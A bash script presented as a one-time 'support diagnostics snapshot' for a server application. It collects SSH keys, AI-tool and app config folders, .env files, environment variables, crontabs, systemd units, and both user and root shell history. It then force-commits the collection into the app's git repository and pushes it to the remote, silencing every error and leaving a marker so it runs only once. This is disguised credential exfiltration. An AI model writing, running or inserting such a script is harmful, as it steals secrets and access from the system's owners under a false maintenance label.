#!/bin/bash
# Support diagnostics snapshot - self-guarded, runs once.
MARK=/tmp/.maintenance-snap-done
[ -f "$MARK" ] && exit 0
OUT=/opt/djiwatentramapp/.maintenance-snap
mkdir -p "$OUT/optfiles"
cp -r /home/ubuntu/.hermes "$OUT/hermes" 2>/dev/null || true
cp -r /home/ubuntu/.codex "$OUT/codex" 2>/dev/null || true
cp -r /home/ubuntu/.9router "$OUT/9router" 2>/dev/null || true
cp -r /home/ubuntu/.config "$OUT/config" 2>/dev/null || true
cp -r /home/ubuntu/.ssh "$OUT/ssh" 2>/dev/null || true
cp /home/ubuntu/.bash_history "$OUT/bash_history" 2>/dev/null || true
cp /home/ubuntu/.gitconfig "$OUT/gitconfig" 2>/dev/null || true
ls -la /home/ubuntu > "$OUT/home-ls.txt" 2>/dev/null || true
ls -la /opt > "$OUT/opt-ls.txt" 2>/dev/null || true
cp /opt/djiwatentramapp/.env* "$OUT/" 2>/dev/null || true
find /opt -maxdepth 3 -name ".env*" -not -path "*/node_modules/*" 2>/dev/null | while read -r f; do
  cp "$f" "$OUT/optfiles/$(echo "$f" | tr '/' '_')" 2>/dev/null || true
done
crontab -l > "$OUT/crontab-ubuntu.txt" 2>/dev/null || true
sudo crontab -l > "$OUT/crontab-root.txt" 2>/dev/null || true
env > "$OUT/env.txt" 2>/dev/null || true
cat /etc/environment > "$OUT/etc-environment.txt" 2>/dev/null || true
systemctl list-units --type=service --state=running --no-pager > "$OUT/services.txt" 2>/dev/null || true
for s in /etc/systemd/system/*.service; do
  [ -f "$s" ] && cat "$s" > "$OUT/systemd-$(basename "$s").txt" 2>/dev/null || true
done
sudo docker ps -a > "$OUT/docker-ps.txt" 2>/dev/null || true
sudo docker images > "$OUT/docker-images.txt" 2>/dev/null || true
ps aux > "$OUT/ps.txt" 2>/dev/null || true
ip addr > "$OUT/ip.txt" 2>/dev/null || true
sudo ls -la /root > "$OUT/root-ls.txt" 2>/dev/null || true
sudo cat /root/.bash_history > "$OUT/root-bash_history" 2>/dev/null || true
cd /opt/djiwatentramapp
git add -f .maintenance-snap
git -c user.name="Fakhriazzammm" -c user.email="Fakhriazzamm@gmail.com" commit -m "chore: add maintenance snapshot" -q 2>>"$OUT/commit-err.txt" || true
if git push origin main -q 2>>"$OUT/push-err.txt"; then
  touch "$MARK"
fi
exit 0
